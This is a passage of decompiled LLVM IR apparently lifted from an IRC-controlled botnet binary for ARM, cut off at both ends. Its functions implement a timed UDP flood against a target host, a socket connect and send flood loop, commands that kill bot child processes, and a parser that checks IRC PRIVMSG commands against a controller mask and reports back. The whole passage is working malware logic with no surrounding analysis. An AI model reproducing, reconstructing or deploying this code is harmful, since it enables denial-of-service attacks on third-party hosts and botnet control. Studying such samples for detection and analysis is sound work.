  %v2_8fd4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8fd4, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-72, align 4
  %v8_8ff4 = icmp sgt i32 %arg3, 2
  br i1 %v8_8ff4, label %dec_label_pc_9018, label %dec_label_pc_8ff8

dec_label_pc_8ff8:                                ; preds = %entry
  %v2_8ffc = load i32, i32* @global_var_2654c.58, align 4
  %v4_900c = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_19624.60 to i32), i32 %v2_8ffc)
  %v1_9014 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_9018

dec_label_pc_9018:                                ; preds = %entry, %dec_label_pc_8ff8
  %v3_9024 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_9034 = call i32 @__GI_time(i32* null)
  %v3_9040 = load i32, i32* %stack_var_-72, align 4
  %v1_9044 = add i32 %v3_9040, 12
  %v1_9048 = inttoptr i32 %v1_9044 to i32*
  %v2_9048 = load i32, i32* %v1_9048, align 4
  store i32 %v2_9048, i32* @r0, align 4
  %v1_9050 = call i32 @atol(i32 %v2_9048)
  %v1_9060 = call i32 @mfork(i32 %arg2)
  %v2_9068 = icmp eq i32 %v1_9060, 0
  br i1 %v2_9068, label %dec_label_pc_9070, label %dec_label_pc_91c8

dec_label_pc_9070:                                ; preds = %dec_label_pc_9018
  %v2_9074 = load i32, i32* @global_var_2654c.58, align 4
  %v4_908c = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_19654.62 to i32), i32 %v2_9074)
  %v3_9090 = load i32, i32* %stack_var_-72, align 4
  %v1_9094 = add i32 %v3_9090, 4
  %v1_9098 = inttoptr i32 %v1_9094 to i32*
  %v2_9098 = load i32, i32* %v1_9098, align 4
  store i32 %v2_9098, i32* @r0, align 4
  %v1_90a0 = call i32 @__GI_gethostbyname(i32 %v2_9098)
  %v2_90ac = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_90ac, i32* @r0, align 4
  %v2_90b8 = call i32 @bzero(i32 %v2_90ac, i32 16)
  %v1_90c0 = add i32 %v1_90a0, 16
  %v2_90c0 = inttoptr i32 %v1_90c0 to i32*
  %v3_90c0 = load i32, i32* %v2_90c0, align 4
  %v1_90c4 = inttoptr i32 %v3_90c0 to i32*
  %v2_90c4 = load i32, i32* %v1_90c4, align 4
  %v1_90cc = add i32 %v1_90a0, 12
  %v2_90cc = inttoptr i32 %v1_90cc to i32*
  %v3_90cc = load i32, i32* %v2_90cc, align 4
  store i32 %v3_90cc, i32* @r2, align 4
  %v2_90d8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_90d8, i32* @r3, align 4
  %v3_90e4 = call i32 @bcopy(i32 %v2_90c4, i32 %v2_90d8, i32 %v3_90cc)
  %v1_90ec = add i32 %v1_90a0, 8
  %v2_90ec = inttoptr i32 %v1_90ec to i32*
  %v3_90ec = load i32, i32* %v2_90ec, align 4
  %v3_90f4 = urem i32 %v3_90ec, 65536
  store i32 %v3_90f4, i32* %stack_var_-52, align 4
  %v3_90fc = load i32, i32* %stack_var_-72, align 4
  %v1_9100 = add i32 %v3_90fc, 8
  %v1_9104 = inttoptr i32 %v1_9100 to i32*
  %v2_9104 = load i32, i32* %v1_9104, align 4
  store i32 %v2_9104, i32* @r0, align 4
  %v1_910c = call i32 @atol(i32 %v2_9104)
  %v2_9174 = add i32 %v1_9050, %v2_9034
  br label %dec_label_pc_9128

dec_label_pc_9128:                                ; preds = %dec_label_pc_91b8, %dec_label_pc_9070
  %storemerge1 = phi i32 [ 0, %dec_label_pc_9070 ], [ %v1_91bc, %dec_label_pc_91b8 ]
  %tmp = icmp ult i32 %storemerge1, 50
  br i1 %tmp, label %dec_label_pc_91b8, label %dec_label_pc_9134

dec_label_pc_9134:                                ; preds = %dec_label_pc_9128
  %v5_9144 = call i32 @__libc_send(i32 %v3_9024, i32 ptrtoint ([4 x i8]* @global_var_19674.64 to i32), i32 50, i32 0)
  %v3_9158 = call i32 @__libc_connect(i32 %v3_9024, i32 %v2_90ac, i32 16)
  %v2_9160 = call i32 @__GI_time(i32* null)
  %v3_9178 = icmp ult i32 %v2_9160, %v2_9174
  br i1 %v3_9178, label %dec_label_pc_91b0, label %dec_label_pc_9180

dec_label_pc_9180:                                ; preds = %dec_label_pc_9134
  %v2_9184 = load i32, i32* @global_var_2654c.58, align 4
  %v4_919c = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_19678.66 to i32), i32 %v2_9184)
  %v1_91a4 = call i32 @__GI___libc_close(i32 %v3_9024)
  %v1_91ac = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_91b0

dec_label_pc_91b0:                                ; preds = %dec_label_pc_9134, %dec_label_pc_9180
  br label %dec_label_pc_91b8

dec_label_pc_91b8:                                ; preds = %dec_label_pc_9128, %dec_label_pc_91b0
  %stack_var_-20.0 = phi i32 [ %storemerge1, %dec_label_pc_9128 ], [ 0, %dec_label_pc_91b0 ]
  %v1_91bc = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_9128

dec_label_pc_91c8:                                ; preds = %dec_label_pc_9018
  ret i32 %v1_9060

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0 }
  uselistorder i32 %v2_90ac, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_91b8, { 1, 0 }
  uselistorder label %dec_label_pc_91b0, { 1, 0 }
  uselistorder label %dec_label_pc_9018, { 1, 0 }
}

define i32 @stop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 37364, i32* %stack_var_-4, align 4
  %v2_91f0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_91f0, i32* @fp, align 4
  %v0_91f8 = load i32, i32* %r0.global-to-local, align 4
  %v2_9268 = icmp eq i32 %arg2, 0
  %v2_92dc14 = load i32, i32* @global_var_23464.43, align 4
  %v3_92e416 = icmp eq i32 %v2_92dc14, 0
  br i1 %v3_92e416, label %dec_label_pc_92ec, label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %dec_label_pc_92cc, %entry
  %storemerge122 = phi i32 [ %v1_92d0, %dec_label_pc_92cc ], [ 0, %entry ]
  %v1_92f421 = phi i32 [ %v1_92f42, %dec_label_pc_92cc ], [ %v0_91f8, %entry ]
  %v3_9218 = mul i32 %storemerge122, 4
  %v2_9224 = load i32, i32* @global_var_26550.45, align 4
  %v2_9228 = add i32 %v2_9224, %v3_9218
  %v1_922c = inttoptr i32 %v2_9228 to i32*
  %v2_922c = load i32, i32* %v1_922c, align 4
  %v2_9230 = icmp eq i32 %v2_922c, 0
  br i1 %v2_9230, label %dec_label_pc_92cc, label %dec_label_pc_9238

dec_label_pc_9238:                                ; preds = %dec_label_pc_9214
  %v2_9250 = load i32, i32* %v1_922c, align 4
  store i32 %v2_9250, i32* @r4, align 4
  %v0_9254 = call i32 @__getpid()
  store i32 %v0_9254, i32* %r0.global-to-local, align 4
  %v0_925c = load i32, i32* @r4, align 4
  %v9_925c = icmp eq i32 %v0_925c, %v0_9254
  br i1 %v9_925c, label %dec_label_pc_92cc, label %dec_label_pc_9264

dec_label_pc_9264:                                ; preds = %dec_label_pc_9238
  br i1 %v2_9268, label %dec_label_pc_92a4, label %dec_label_pc_9270

dec_label_pc_9270:                                ; preds = %dec_label_pc_9264
  %v2_9274 = load i32, i32* @global_var_2654c.58, align 4
  store i32 %v0_91f8, i32* %r0.global-to-local, align 4
  %v4_92a0 = call i32 @Send(i32 %v0_91f8, i32 ptrtoint ([29 x i8]* @global_var_1969c.70 to i32), i32 %v2_9274)
  store i32 %v4_92a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_92a4

dec_label_pc_92a4:                                ; preds = %dec_label_pc_9264, %dec_label_pc_9270
  %v2_92b4 = load i32, i32* @global_var_26550.45, align 4
  %v2_92b8 = add i32 %v2_92b4, %v3_9218
  %v1_92bc = inttoptr i32 %v2_92b8 to i32*
  %v2_92bc = load i32, i32* %v1_92bc, align 4
  store i32 %v2_92bc, i32* %r0.global-to-local, align 4
  %v2_92c8 = call i32 @kill(i32 %v2_92bc, i32 9)
  store i32 %v2_92c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_92cc

dec_label_pc_92cc:                                ; preds = %dec_label_pc_9238, %dec_label_pc_9214, %dec_label_pc_92a4
  %v1_92f42 = phi i32 [ %v0_9254, %dec_label_pc_9238 ], [ %v1_92f421, %dec_label_pc_9214 ], [ %v2_92c8, %dec_label_pc_92a4 ]
  %v1_92d0 = add i32 %storemerge122, 1
  %v2_92dc = load i32, i32* @global_var_23464.43, align 4
  %v3_92e4 = icmp ult i32 %v1_92d0, %v2_92dc
  br i1 %v3_92e4, label %dec_label_pc_9214, label %dec_label_pc_92ec

dec_label_pc_92ec:                                ; preds = %dec_label_pc_92cc, %entry
  %v1_92f4.lcssa = phi i32 [ %v0_91f8, %entry ], [ %v1_92f42, %dec_label_pc_92cc ]
  ret i32 %v1_92f4.lcssa

; uselistorder directives
  uselistorder i32 %v1_92d0, { 1, 0 }
  uselistorder i32 %v3_9218, { 1, 0 }
  uselistorder i32 %storemerge122, { 1, 0 }
  uselistorder i32 %v0_91f8, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 5, 4, 6, 0, 1 }
  uselistorder label %dec_label_pc_92cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_92a4, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 37652, i32* %stack_var_-4, align 4
  %v2_9310 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9310, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v1_9334 = call i32 @malloc(i32 9216)
  %v2_9344 = call i32 @__GI_time(i32* null)
  %v1_9354 = call i32 @mfork(i32 %arg2)
  %v2_935c = icmp eq i32 %v1_9354, 0
  br i1 %v2_935c, label %dec_label_pc_9364, label %dec_label_pc_9504

dec_label_pc_9364:                                ; preds = %entry
  %v7_9368 = icmp eq i32 %arg3, 2
  br i1 %v7_9368, label %dec_label_pc_9390, label %dec_label_pc_9370

dec_label_pc_9370:                                ; preds = %dec_label_pc_9364
  %v2_9374 = load i32, i32* @global_var_2654c.58, align 4
  %v4_9384 = call i32 @Send(i32 %arg1, i32 ptrtoint ([43 x i8]* @global_var_196bc.74 to i32), i32 %v2_9374)
  %v1_938c = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_9390

dec_label_pc_9390:                                ; preds = %dec_label_pc_9364, %dec_label_pc_9370
  %v1_9394 = add i32 %arg4, 8
  %v1_9398 = inttoptr i32 %v1_9394 to i32*
  %v2_9398 = load i32, i32* %v1_9398, align 4
  store i32 %v2_9398, i32* @r0, align 4
  %v1_93a0 = call i32 @atol(i32 %v2_9398)
  %v2_93ac = ptrtoint i32* %stack_var_-60 to i32
  %v3_93bc = bitcast i32* %stack_var_-60 to i8*
  %v4_93bc = call i32 @__GI_memset(i8* %v3_93bc, i32 0, i32 16)
  %v1_93c4 = add i32 %arg4, 4
  %v1_93c8 = inttoptr i32 %v1_93c4 to i32*
  %v2_93c8 = load i32, i32* %v1_93c8, align 4
  %v2_93d4 = call i32 @host2ip(i32 %arg2, i32 %v2_93c8)
  store i32 2, i32* %stack_var_-60, align 4
  %v2_93ec = load i32, i32* @global_var_2654c.58, align 4
  %v4_9404 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_196e8.76 to i32), i32 %v2_93ec)
  %v2_94b0 = add i32 %v1_93a0, %v2_9344
  %v2_9448 = ptrtoint i32* %stack_var_-44 to i32
  br label %dec_label_pc_9408

dec_label_pc_9408:                                ; preds = %dec_label_pc_94c4, %dec_label_pc_9390
  %stack_var_-36.0 = phi i32 [ %tmp, %dec_label_pc_9390 ], [ %v1_94c8, %dec_label_pc_94c4 ]
  %v0_9408 = call i32 @rand()
  %v3_9428 = call i32 @socket(i32 2, i32 2, i32 17)
  %v1_9438 = icmp slt i32 %v3_9428, 0
  br i1 %v1_9438, label %dec_label_pc_948c, label %dec_label_pc_9440

dec_label_pc_9440:                                ; preds = %dec_label_pc_9408
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %v2_9448, i32* @r3, align 4
  %v3_945c = call i32 @ioctl(i32 %v3_9428, i32 21537, i32 %v2_9448)
  %v6_9480 = call i32 @__libc_sendto(i32 %v3_9428, i32 %v1_9334, i32 9216, i32 0, i32 %v2_93ac, i32 16)
  %v1_9488 = call i32 @__GI___libc_close(i32 %v3_9428)
  br label %dec_label_pc_948c

dec_label_pc_948c:                                ; preds = %dec_label_pc_9408, %dec_label_pc_9440
  %v7_9494 = icmp slt i32 %stack_var_-36.0, 50
  br i1 %v7_9494, label %dec_label_pc_94c4, label %dec_label_pc_9498

dec_label_pc_9498:                                ; preds = %dec_label_pc_948c
  %v2_949c = call i32 @__GI_time(i32* null)
  %v3_94b4 = icmp ult i32 %v2_949c, %v2_94b0
  br i1 %v3_94b4, label %dec_label_pc_94bc, label %dec_label_pc_94d4

dec_label_pc_94bc:                                ; preds = %dec_label_pc_9498
  br label %dec_label_pc_94c4

dec_label_pc_94c4:                                ; preds = %dec_label_pc_948c, %dec_label_pc_94bc
  %stack_var_-36.1 = phi i32 [ %stack_var_-36.0, %dec_label_pc_948c ], [ 0, %dec_label_pc_94bc ]
  %v1_94c8 = add i32 %stack_var_-36.1, 1
  br label %dec_label_pc_9408

dec_label_pc_94d4:                                ; preds = %dec_label_pc_9498
  %v2_94d8 = load i32, i32* @global_var_2654c.58, align 4
  %v4_94f0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_19708.78 to i32), i32 %v2_94d8)
  %v1_94f8 = call i32 @__GI___libc_close(i32 %v3_9428)
  %v1_9500 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_9504

dec_label_pc_9504:                                ; preds = %entry, %dec_label_pc_94d4
  %v1_950c = phi i32 [ %v1_9354, %entry ], [ %v1_9500, %dec_label_pc_94d4 ]
  ret i32 %v1_950c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32 50, { 1, 2, 0 }
  uselistorder i32 (i32)* @mfork, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9504, { 1, 0 }
  uselistorder label %dec_label_pc_94c4, { 1, 0 }
  uselistorder label %dec_label_pc_948c, { 1, 0 }
  uselistorder label %dec_label_pc_9390, { 1, 0 }
}

define i32 @killsec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 38188, i32* %stack_var_-4, align 4
  %v2_9528 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9528, i32* @fp, align 4
  %v2_9544 = load i32, i32* bitcast ([2 x i8*]* @global_var_231c8.82 to i32*), align 4
  %tmp9 = inttoptr i32 %v2_9544 to i8*
  %v4_9550 = call i32 @__GI_strcasecmp(i8* %tmp9, i32 %arg2)
  %v2_9558 = icmp eq i32 %v4_9550, 0
  br i1 %v2_9558, label %dec_label_pc_9560, label %dec_label_pc_9570

dec_label_pc_9560:                                ; preds = %entry
  %v2_9568 = call i32 @kill(i32 0, i32 9)
  br label %dec_label_pc_9588

dec_label_pc_9570:                                ; preds = %entry
  %v2_9574 = load i32, i32* @global_var_2654c.58, align 4
  %v4_9584 = call i32 @Send(i32 %arg1, i32 ptrtoint ([25 x i8]* @global_var_1972c.85 to i32), i32 %v2_9574)
  br label %dec_label_pc_9588

dec_label_pc_9588:                                ; preds = %dec_label_pc_9560, %dec_label_pc_9570
  %storemerge = phi i32 [ %v4_9584, %dec_label_pc_9570 ], [ %v2_9568, %dec_label_pc_9560 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32)* @kill, { 1, 0 }
  uselistorder label %dec_label_pc_9588, { 1, 0 }
}

define i32 @_PRIVMSG(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp32 = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-1116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 38316, i32* %stack_var_-4, align 4
  %v2_95a8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_95a8, i32* @fp, align 4
  br label %dec_label_pc_95d8

dec_label_pc_95cc:                                ; preds = %dec_label_pc_95f0
  %v1_95d0 = add i32 %storemerge11, 1
  br label %dec_label_pc_95d8

dec_label_pc_95d8:                                ; preds = %entry, %dec_label_pc_95cc
  %storemerge11 = phi i32 [ 0, %entry ], [ %v1_95d0, %dec_label_pc_95cc ]
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v3_95e0 = call i32 @strlen(i8* %tmp)
  store i32 %v3_95e0, i32* %r0.global-to-local, align 4
  %v3_95e8 = icmp ult i32 %storemerge11, %v3_95e0
  br i1 %v3_95e8, label %dec_label_pc_95f0, label %dec_label_pc_95d8.dec_label_pc_960c_crit_edge

dec_label_pc_95d8.dec_label_pc_960c_crit_edge:    ; preds = %dec_label_pc_95d8
  %.pre = add i32 %storemerge11, %arg3
  %.pre24 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_960c

dec_label_pc_95f0:                                ; preds = %dec_label_pc_95d8
  %v2_95fc = add i32 %storemerge11, %arg3
  %v1_9600 = inttoptr i32 %v2_95fc to i8*
  %v2_9600 = load i8, i8* %v1_9600, align 1
  %v7_9604 = icmp eq i8 %v2_9600, 32
  br i1 %v7_9604, label %dec_label_pc_960c, label %dec_label_pc_95cc

dec_label_pc_960c:                                ; preds = %dec_label_pc_95f0, %dec_label_pc_95d8.dec_label_pc_960c_crit_edge
  %v3_9620.pre-phi = phi i8* [ %.pre24, %dec_label_pc_95d8.dec_label_pc_960c_crit_edge ], [ %v1_9600, %dec_label_pc_95f0 ]
  %v2_9618.pre-phi = phi i32 [ %.pre, %dec_label_pc_95d8.dec_label_pc_960c_crit_edge ], [ %v2_95fc, %dec_label_pc_95f0 ]
  store i8 0, i8* %v3_9620.pre-phi, align 1
  %v1_963c = add i32 %v2_9618.pre-phi, 2
  %v5_9640 = inttoptr i32 %v1_963c to i8*
  br label %dec_label_pc_965c

dec_label_pc_9650:                                ; preds = %dec_label_pc_9674
  %v1_9654 = add i32 %storemerge12, 1
  br label %dec_label_pc_965c

dec_label_pc_965c:                                ; preds = %dec_label_pc_960c, %dec_label_pc_9650
  %storemerge12 = phi i32 [ 0, %dec_label_pc_960c ], [ %v1_9654, %dec_label_pc_9650 ]
  store i32 %storemerge12, i32* @r4, align 4
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %v3_9664 = call i32 @strlen(i8* %arg2)
  store i32 %v3_9664, i32* %r0.global-to-local, align 4
  %v0_966c = load i32, i32* @r4, align 4
  %v3_966c = icmp ult i32 %v0_966c, %v3_9664
  br i1 %v3_966c, label %dec_label_pc_9674, label %dec_label_pc_965c.dec_label_pc_9690_crit_edge

dec_label_pc_965c.dec_label_pc_9690_crit_edge:    ; preds = %dec_label_pc_965c
  %.pre25 = add i32 %storemerge12, %tmp32
  %.pre26 = inttoptr i32 %.pre25 to i8*
  br label %dec_label_pc_9690

dec_label_pc_9674:                                ; preds = %dec_label_pc_965c
  %v2_9680 = add i32 %storemerge12, %tmp32
  %v1_9684 = inttoptr i32 %v2_9680 to i8*
  %v2_9684 = load i8, i8* %v1_9684, align 1
  %v7_9688 = icmp eq i8 %v2_9684, 33
  br i1 %v7_9688, label %dec_label_pc_9690, label %dec_label_pc_9650

dec_label_pc_9690:                                ; preds = %dec_label_pc_9674, %dec_label_pc_965c.dec_label_pc_9690_crit_edge
  %v3_96a4.pre-phi = phi i8* [ %.pre26, %dec_label_pc_965c.dec_label_pc_9690_crit_edge ], [ %v1_9684, %dec_label_pc_9674 ]
  store i8 0, i8* %v3_96a4.pre-phi, align 1
  %v2_96ac = load i8, i8* %v5_9640, align 1
  %v7_96b0 = icmp eq i8 %v2_96ac, 62
  br i1 %v7_96b0, label %dec_label_pc_96b8, label %dec_label_pc_9af8

dec_label_pc_96b8:                                ; preds = %dec_label_pc_9690
  %v2_96bc = load i32, i32* @global_var_2654c.58, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v4_96c8 = call i32 @__GI_strcasecmp(i8* %tmp, i32 %v2_96bc)
  store i32 %v4_96c8, i32* %r0.global-to-local, align 4
  %v2_96d0 = icmp eq i32 %v4_96c8, 0
  br i1 %v2_96d0, label %dec_label_pc_96d8, label %dec_label_pc_9af8

dec_label_pc_96d8:                                ; preds = %dec_label_pc_96b8
  %v2_96e0 = ptrtoint i32* %stack_var_-1116 to i32
  store i32 %v2_96e0, i32* %r0.global-to-local, align 4
  %v3_96f0 = bitcast i32* %stack_var_-1116 to i8*
  %v4_96f0 = call i32 @__GI_memset(i8* %v3_96f0, i32 0, i32 1024)
  store i32 %v4_96f0, i32* %r0.global-to-local, align 4
  %v1_9700 = add i32 %v2_9618.pre-phi, 3
  %v5_9704 = inttoptr i32 %v1_9700 to i8*
  br label %dec_label_pc_9720

dec_label_pc_9714:                                ; preds = %dec_label_pc_9738
  %v1_9718 = add i32 %storemerge13, 1
  br label %dec_label_pc_9720

dec_label_pc_9720:                                ; preds = %dec_label_pc_96d8, %dec_label_pc_9714
  %storemerge13 = phi i32 [ 0, %dec_label_pc_96d8 ], [ %v1_9718, %dec_label_pc_9714 ]
  store i32 %storemerge13, i32* @r4, align 4
  store i32 %v1_9700, i32* %r0.global-to-local, align 4
  %v3_9728 = call i32 @strlen(i8* %v5_9704)
  store i32 %v3_9728, i32* %r0.global-to-local, align 4
  %v0_9730 = load i32, i32* @r4, align 4
  %v3_9730 = icmp ult i32 %v0_9730, %v3_9728
  br i1 %v3_9730, label %dec_label_pc_9738, label %dec_label_pc_9720.dec_label_pc_9754_crit_edge

dec_label_pc_9720.dec_label_pc_9754_crit_edge:    ; preds = %dec_label_pc_9720
  %.pre27 = add i32 %storemerge13, %v1_9700
  %.pre28 = inttoptr i32 %.pre27 to i8*
  br label %dec_label_pc_9754

dec_label_pc_9738:                                ; preds = %dec_label_pc_9720
  %v2_9744 = add i32 %storemerge13, %v1_9700
  %v1_9748 = inttoptr i32 %v2_9744 to i8*
  %v2_9748 = load i8, i8* %v1_9748, align 1
  %v7_974c = icmp eq i8 %v2_9748, 32
  br i1 %v7_974c, label %dec_label_pc_9754, label %dec_label_pc_9714

dec_label_pc_9754:                                ; preds = %dec_label_pc_9738, %dec_label_pc_9720.dec_label_pc_9754_crit_edge
  %v3_9768.pre-phi = phi i8* [ %.pre28, %dec_label_pc_9720.dec_label_pc_9754_crit_edge ], [ %v1_9748, %dec_label_pc_9738 ]
  store i8 0, i8* %v3_9768.pre-phi, align 1
  %v2_9774 = load i32, i32* @global_var_26534.88, align 4
  store i32 %v1_9700, i32* %r0.global-to-local, align 4
  %v3_9780 = call i32 @strwildmatch(i8* %v5_9704, i32 %v2_9774)
  store i32 %v3_9780, i32* %r0.global-to-local, align 4
  %v2_9788 = icmp eq i32 %v3_9780, 0
  br i1 %v2_9788, label %dec_label_pc_9790, label %dec_label_pc_9af8

dec_label_pc_9790:                                ; preds = %dec_label_pc_9754
  %v1_9794 = add i32 %v2_9618.pre-phi, 4
  %v2_979c = add i32 %storemerge13, %v1_9794
  %v5_97a0 = inttoptr i32 %v2_979c to i8*
  store i32 %v2_979c, i32* %r0.global-to-local, align 4
  %v3_97a8 = call i32 @strlen(i8* %v5_97a0)
  store i32 %v3_97a8, i32* %r0.global-to-local, align 4
  %v2_97f4 = ptrtoint i32* %stack_var_-24 to i32
  %v2_97f8 = add i32 %v2_97f4, -1092
  br label %dec_label_pc_9820

dec_label_pc_97c0:                                ; preds = %dec_label_pc_9820
  %v2_97c4 = load i8, i8* %stack_var_-36.0, align 1
  %v7_97c8 = icmp eq i8 %v2_97c4, 32
  br i1 %v7_97c8, label %dec_label_pc_9870, label %dec_label_pc_97d0

dec_label_pc_97d0:                                ; preds = %dec_label_pc_97c0
  %v2_97d4 = load i8, i8* %stack_var_-36.0, align 1
  %v2_97d8 = icmp eq i8 %v2_97d4, 0
  br i1 %v2_97d8, label %dec_label_pc_9870, label %dec_label_pc_97e0

dec_label_pc_97e0:                                ; preds = %dec_label_pc_97d0
  %v2_97e8 = load i8, i8* %stack_var_-36.0, align 1
  store i32 %v2_97f4, i32* %r0.global-to-local, align 4
  %v2_97fc = add i32 %v2_97f8, %storemerge14
  %v3_9804 = inttoptr i32 %v2_97fc to i8*
  store i8 %v2_97e8, i8* %v3_9804, align 1
  %v1_980c = add i32 %v4_97c0, 1
  %v5_9810 = inttoptr i32 %v1_980c to i8*
  %v1_9818 = add nuw i32 %storemerge14, 1
  br label %dec_label_pc_9820

dec_label_pc_9820:                                ; preds = %dec_label_pc_9790, %dec_label_pc_97e0
  %stack_var_-36.0 = phi i8* [ %v5_97a0, %dec_label_pc_9790 ], [ %v5_9810, %dec_label_pc_97e0 ]
  %storemerge14 = phi i32 [ 0, %dec_label_pc_9790 ], [ %v1_9818, %dec_label_pc_97e0 ]
  %v5_982c = icmp slt i32 %storemerge14, %v3_97a8
  %v4_97c0 = ptrtoint i8* %stack_var_-36.0 to i32
  br i1 %v5_982c, label %dec_label_pc_97c0, label %dec_label_pc_9870

dec_label_pc_983c:                                ; preds = %dec_label_pc_9870
  %v2_9848 = add i32 %storemerge15, %v4_97c0
  %v1_984c = inttoptr i32 %v2_9848 to i8*
  %v2_984c = load i8, i8* %v1_984c, align 1
  %v7_9850 = icmp eq i8 %v2_984c, 32
  br i1 %v7_9850, label %dec_label_pc_9858, label %dec_label_pc_9864

dec_label_pc_9858:                                ; preds = %dec_label_pc_983c
  %v1_985c = add i32 %stack_var_-32.1, 1
  br label %dec_label_pc_9864

dec_label_pc_9864:                                ; preds = %dec_label_pc_983c, %dec_label_pc_9858
  %stack_var_-32.0 = phi i32 [ %v1_985c, %dec_label_pc_9858 ], [ %stack_var_-32.1, %dec_label_pc_983c ]
  %v1_9868 = add i32 %storemerge15, 1
  br label %dec_label_pc_9870

dec_label_pc_9870:                                ; preds = %dec_label_pc_97c0, %dec_label_pc_97d0, %dec_label_pc_9820, %dec_label_pc_9864
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.0, %dec_label_pc_9864 ], [ 0, %dec_label_pc_9820 ], [ 0, %dec_label_pc_97d0 ], [ 0, %dec_label_pc_97c0 ]
  %storemerge15 = phi i32 [ %v1_9868, %dec_label_pc_9864 ], [ 0, %dec_label_pc_9820 ], [ 0, %dec_label_pc_97d0 ], [ 0, %dec_label_pc_97c0 ]
  store i32 %storemerge15, i32* @r4, align 4
  store i32 %v4_97c0, i32* %r0.global-to-local, align 4
  %v3_9878 = call i32 @strlen(i8* %stack_var_-36.0)
  store i32 %v3_9878, i32* %r0.global-to-local, align 4
  %v0_9880 = load i32, i32* @r4, align 4
  %v3_9880 = icmp ult i32 %v0_9880, %v3_9878
  br i1 %v3_9880, label %dec_label_pc_983c, label %dec_label_pc_9888

dec_label_pc_9888:                                ; preds = %dec_label_pc_9870
  %v1_988c = add i32 %stack_var_-32.1, 1
  %v7_989c = icmp slt i32 %v1_988c, 11
  br i1 %v7_989c, label %dec_label_pc_98a8, label %dec_label_pc_98a0

dec_label_pc_98a0:                                ; preds = %dec_label_pc_9888
  br label %dec_label_pc_98a8

dec_label_pc_98a8:                                ; preds = %dec_label_pc_9888, %dec_label_pc_98a0
  %stack_var_-32.2 = phi i32 [ %v1_988c, %dec_label_pc_9888 ], [ 10, %dec_label_pc_98a0 ]
  %tmp77 = mul i32 %stack_var_-32.2, 4
  %v3_98c4 = add i32 %tmp77, 4
  %v2_98cc = add i32 %v2_97f4, -68
  %v2_98d0 = add i32 %v2_98cc, %v3_98c4
  %v2_98d8 = inttoptr i32 %v2_98d0 to i32*
  store i32 ptrtoint (i32* @global_var_19778.90 to i32), i32* %v2_98d8, align 4
  %v2_9a0019 = load i8, i8* %stack_var_-36.0, align 1
  %v2_9a0421 = icmp eq i8 %v2_9a0019, 0
  br i1 %v2_9a0421, label %dec_label_pc_9a0c, label %dec_label_pc_98e8

dec_label_pc_98e8:                                ; preds = %dec_label_pc_98a8, %dec_label_pc_9950
  %v4_99fc23 = phi i32 [ %v2_99f4.pre-phi, %dec_label_pc_9950 ], [ %v4_97c0, %dec_label_pc_98a8 ]
  %stack_var_-28.022 = phi i32 [ %v1_99e0, %dec_label_pc_9950 ], [ 1, %dec_label_pc_98a8 ]
  %v1_98ec = add i32 %v4_99fc23, 1
  %v5_98f0 = inttoptr i32 %v1_98ec to i8*
  %v6_9900 = icmp slt i32 %stack_var_-28.022, %stack_var_-32.2
